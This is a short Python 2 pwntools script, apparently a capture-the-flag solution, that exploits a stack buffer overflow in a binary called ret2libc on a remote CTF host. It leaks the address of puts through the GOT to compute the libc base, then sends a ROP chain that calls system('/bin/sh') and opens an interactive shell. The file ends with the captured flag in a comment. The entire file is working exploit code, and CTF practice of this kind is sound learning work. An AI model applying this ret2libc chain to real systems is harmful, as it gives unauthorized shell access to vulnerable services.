#!/usr/bin/python2
from pwn import *

# p = process('./ret2libc')
binary = context.binary = ELF('./ret2libc',checksec=False)
p = remote('ctf.joshl.ca',31341)
# binary = ELF('./ret2libc')
libc = ELF('libc6_2.31-0ubuntu8_amd64.so')
padding = 0x28
pop_rdi = 0x0000000000401273
return_add = 0x000000000040101a

payload = 'A'*padding
payload += p64(pop_rdi)
payload += p64(binary.got['puts'])
payload += p64(binary.plt['puts'])
payload += p64(binary.symbols['main'])

p.sendline(payload)

leak = p.recvuntil('Goodbye!\n')
leak_libc = u64(p.recvline()[:-1].ljust(8,'\x00'))
print(hex(leak_libc))
libc.address = leak_libc - libc.sym['puts']
# print(hex(libc_base))

payload = flat(
    'A'*padding,
    pop_rdi,
    next(libc.search('/bin/sh\x00')),
    return_add, #ret
    libc.sym['system'],
)
p.sendline(payload)
p.interactive()

#ctf{congrats_on_mastering_the_core_of_binary_exploitation!}